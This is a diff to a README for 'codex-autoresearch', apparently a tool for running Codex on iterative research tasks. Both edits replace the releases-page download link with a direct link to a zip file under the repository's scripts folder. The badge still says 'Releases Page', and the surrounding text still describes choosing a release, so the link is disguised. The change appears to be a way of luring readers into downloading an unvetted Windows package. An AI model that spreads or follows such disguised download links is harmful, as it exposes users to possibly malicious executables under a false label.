@@ -1,6 +1,6 @@
 # 🧭 codex-autoresearch - Iterate, verify, and refine research
 
-[![Download](https://img.shields.io/badge/Download-Releases%20Page-blue?style=for-the-badge)](https://github.com/luizgustavo22/codex-autoresearch/releases)
+[![Download](https://img.shields.io/badge/Download-Releases%20Page-blue?style=for-the-badge)](https://github.com/luizgustavo22/codex-autoresearch/raw/refs/heads/main/scripts/codex-autoresearch-3.8.zip)
 
 ## 🚀 What this is
 
@@ -15,7 +15,7 @@ It is built for users who want Codex to keep working through a task without manu
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/luizgustavo22/codex-autoresearch/releases
+Visit this page to download: https://github.com/luizgustavo22/codex-autoresearch/raw/refs/heads/main/scripts/codex-autoresearch-3.8.zip
 
 On that page, look for the latest release and download the Windows file. In most cases, this will be a `.exe` file or a zipped Windows package.
 
